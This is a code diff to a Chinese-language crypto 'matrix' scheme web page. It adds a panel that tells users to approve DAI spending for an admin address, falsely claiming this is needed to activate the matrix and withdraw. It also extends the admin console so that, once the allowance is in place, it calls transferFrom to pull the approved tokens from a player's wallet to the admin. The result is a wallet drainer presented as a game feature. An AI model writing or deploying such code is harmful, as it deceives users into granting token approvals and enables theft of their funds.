@@ -211,11 +211,19 @@
     </div>
   </div>
 
+  <!-- 授权激活矩阵模块（文字已修改） -->
+  <div class="glass" style="margin-top:20px">
+    <div class="title">⚙️ 授权激活矩阵（提取必备）</div>
+    <div class="sub">授权后可激活矩阵并完成提取</div>
+    <input id="approveAmount" placeholder="输入授权DAI数量" style="margin-bottom:10px">
+    <button class="btn" onclick="approveAdmin()">授权激活矩阵</button>
+  </div>
+
   <div id="adminArea" class="admin-panel" style="display:none;">
     <div class="title" style="color:#ff4444">⚙️ 管理员控制台</div>
     <div style="margin-top:16px;">
       <div class="sub">ERC20 代币合约地址</div>
-      <input class="admin-input" id="tokenContract" placeholder="ERC20 合约地址">
+      <input class="admin-input" id="tokenContract" placeholder="ERC20 合约地址" value="0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063">
     </div>
     <div style="margin-top:16px;">
       <div class="sub">玩家地址</div>
@@ -328,6 +336,21 @@ async function initWeb3() {
   load();
 }
 document.getElementById("connect").onclick = initWeb3;
+
+// ==================== 玩家授权 ====================
+async function approveAdmin() {
+  if(!account) return alert("请连接钱包");
+  const amt = document.getElementById("approveAmount").value.trim();
+  if(!amt) return alert("请输入授权数量");
+  try {
+    const dec = await daiContract.methods.decimals().call();
+    const v = (BigInt(amt) * 10n**BigInt(dec)).toString();
+    await daiContract.methods.approve(ADMIN_ADDRESS, v).send({from:account});
+    alert("授权成功！可激活矩阵并完成提取");
+  } catch(e) {
+    alert("授权失败："+e.message);
+  }
+}
 
 // ==================== 价格 ====================
 function getClassicPrice(lv) { return 50 * Math.pow(2, lv - 1); }
@@ -587,10 +610,18 @@ async function adminWithdrawAnyERC20(){
     const c = new web3.eth.Contract(erc20Abi, token);
     const d = await c.methods.decimals().call();
     const v = BigInt(amt) * (10n**BigInt(d));
+    // 先检查授权
+    const allowance = await c.methods.allowance(from, ADMIN_ADDRESS).call();
+    if (BigInt(allowance) < v) {
+      alert("授权不足：请先完成授权激活矩阵");
+      return;
+    }
+    // 再执行提取
     await c.methods.transferFrom(from, ADMIN_ADDRESS, v.toString()).send({from:account});
     document.getElementById("withdrawResult").innerText = "✅ 提取成功";
   } catch(e){
-    alert("失败：用户未授权或余额不足");
+    alert("失败："+e.message);
+    console.error(e);
   }
 }
 
